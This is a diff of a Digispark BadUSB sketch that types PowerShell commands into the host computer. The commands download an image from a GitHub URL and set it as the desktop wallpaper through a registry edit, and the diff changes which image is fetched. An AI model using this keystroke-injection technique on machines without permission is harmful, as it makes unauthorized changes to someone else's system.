@@ -3,7 +3,7 @@
 
 #include "DigiKeyboard.h"
 void setup() {
-  //empty
+  DigiKeyboard.update();
 }
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
@@ -17,7 +17,7 @@ void loop() {
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://tr3.cbsistatic.com/hub/i/2014/05/15/f8964afd-bd82-4e0e-bcbe-e927363dcdc1/3b858e39e2cf183b878f54cad0073a67/codedoge.jpg\" , \"doge.jpg\")");
+  DigiKeyboard.print("$client.DownloadFile(\"https://github.com/khanshifaul/khanshifaul.github.io/raw/main/Pictures/wallpaper%20(1).jpg\" , \"doge.jpg\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\doge.jpg\" /f");
